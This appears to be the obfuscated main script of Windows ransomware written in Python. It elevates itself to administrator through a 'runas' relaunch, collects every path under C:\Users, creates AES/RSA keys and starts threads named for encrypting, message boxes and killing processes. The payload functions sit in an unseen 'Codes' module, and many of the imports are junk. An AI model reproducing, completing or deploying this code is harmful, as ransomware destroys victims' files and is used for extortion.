import Codes
import GUI
from asyncio import subprocess #line:1
from bisect import insort #line:2
from cProfile import label #line:3
from cgitb import handler ,text #line:4
from concurrent .futures import thread #line:5
from fileinput import filename #line:6
from importlib .resources import path
from msilib.schema import Font #line:7
from re import T #line:8
from textwrap import fill #line:9
from time import sleep #line:10
import threading #line:11
from tkinter import messagebox #line:12
import tkinter #line:13
from tkinter .filedialog import askopenfile ,asksaveasfile #line:14
from tkinter .ttk import Labelframe #line:15
from traceback import print_tb #line:16
from winreg import REG_RESOURCE_REQUIREMENTS_LIST #line:17
from tkinter import *#line:18
import time #line:19
from getpass import getpass #line:20
from Cryptodome .Cipher import AES #line:21
from Cryptodome .Hash import SHA256 as SHA #line:22
from Cryptodome .Random import get_random_bytes #line:23
import tkinter .messagebox as msgbox #line:24
import tkinter .font #line:25
import tkinter .ttk as ttk #line:26
import glob #line:27
from http .client import ImproperConnectionState #line:28
import os ,random ,struct #line:29
from re import A #line:30
from turtle import goto #line:31
from Cryptodome .Cipher import AES #line:32
from ctypes .wintypes import MSG #line:33
from Cryptodome .PublicKey import RSA #line:34
from Cryptodome import Random #line:35
from Cryptodome .Cipher import PKCS1_OAEP #line:36
from winreg import *#line:37
import sys #line:38
from winreg import *#line:39
import subprocess
import shutil #line:41
import hashlib
import win32com .shell .shell as shell #line:43

if sys .argv [-1 ]!='asadmin':#line:43
    script =os .path .abspath (sys .argv [0 ])#line:44
    params =' '.join ([script ]+sys .argv [1 :]+['asadmin'])#line:45
    shell .ShellExecuteEx (lpVerb ='runas',lpFile =sys .executable ,lpParameters =params )#line:46
    sys .exit (0 )#line:47

if __name__ =="__main__":#line:386
    sps ="C:\\Users\\**"#line:387
    Dirlist =glob .glob (sps ,recursive =True )#line:388
    Dirlist2 =len (Dirlist )#line:389
    Codes.rscpy ()#line:390
    Codes.crtkey ()#line:391
    Codes.cbatfb ()#line:392
    Codes.rndk (1,Codes.AESKey )#line:393s
    d5 =threading .Thread (target =Codes.encrypting ).start ()#line:394
    d6 =threading .Thread (target =Codes.msgb ).start ()#line:395
    d9 =threading .Thread (target =Codes.on_closing ).start ()#line:396
    d10 =threading .Thread (target =Codes.expkill ).start ()#line:397
    p_var2 =DoubleVar ()#line:398
    p_var3 =DoubleVar ()#line:399
    progressbar2 =ttk .Progressbar (GUI.nmys ,orient =HORIZONTAL ,length =685 ,mode ='determinate')#line:400
    progressbar2 .pack ()#line:401
    progressbar3 =ttk .Progressbar (GUI.nmys ,orient =HORIZONTAL ,length =685 ,mode ='determinate')#line:402
    progressbar3 .pack ()#line:403
GUI.nmys .mainloop ()#line:404